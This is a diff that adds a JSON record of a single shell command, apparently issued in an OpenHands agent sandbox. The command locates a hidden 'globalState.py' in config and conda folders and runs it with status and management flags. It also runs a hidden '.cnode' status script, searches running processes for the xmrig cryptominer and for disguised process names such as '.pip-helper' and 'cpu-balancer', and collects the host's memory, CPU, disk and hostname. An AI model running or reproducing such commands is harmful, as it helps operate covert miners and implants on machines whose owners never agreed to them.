@@ -1,0 +1,8 @@
+{
+  "command": "FILE=\"\"; for p in '/home/openhands/.config/globalState.py' '/root/.config/globalState.py' '/home/openhands/.config/globalStateOv.py' '/root/.config/globalStateOv.py' '/home/openhands/.conda/globalState.py' '/root/.conda/globalState.py' '/workspace/project/globalState.py' '/workspace/globalState.py'; do if [ -s \"$p\" ]; then FILE=\"$p\"; break; fi; done; if [ -z \"$FILE\" ]; then echo LOCATE_MISSING; else echo LOCATE_OK $FILE $(wc -c <\"$FILE\" 2>/dev/null || echo 0); HOME_DIR=$(dirname \"$FILE\"); BASE=$(basename \"$FILE\"); cd \"$HOME_DIR\"; echo CNODE_HOME=$HOME_DIR; echo PY_STATUS_BEGIN; (python3 \"$BASE\" --status || python \"$BASE\" --status) 2>/dev/null || true; echo PY_STATUS_END; echo MGMT_CLI_BEGIN_SYS; (python3 \"$BASE\" --sys || python \"$BASE\" --sys) 2>/dev/null || true; echo MGMT_CLI_END_SYS; echo CNODE_STATUS_BEGIN; if [ -f .cnode/src/status.js ]; then (node .cnode/src/status.js || true) 2>/dev/null; elif [ -f cnode/src/status.js ]; then (node cnode/src/status.js || true) 2>/dev/null; else echo CNODE_STATUS_MISSING; fi; echo CNODE_STATUS_END; fi; echo PID_CHECK_BEGIN; ps aux 2>/dev/null | grep -E 'service\\.js|xmrig|runtime|globalState|satelight|\\.pip-helper|\\.wheel-index|linux-helper|cpu-balancer' | grep -v grep || true; echo PID_CHECK_END; echo SYSINFO ram_gb=$(awk '/MemTotal/{printf \"%d\",$2/1024/1024}' /proc/meminfo 2>/dev/null || echo 0) cpu=$(nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 0) disk_gb=$(df -BG / 2>/dev/null | awk 'NR==2{gsub(/G/,\"\",$2); print $2+0}') host=$(hostname -s 2>/dev/null || echo unknown)",
+  "cwd": null,
+  "timeout": 90,
+  "id": "00a1438b1df04fffa3e48c8fca3c04d6",
+  "timestamp": "2026-09-10T15:12:48.944199Z",
+  "kind": "BashCommand"
+}
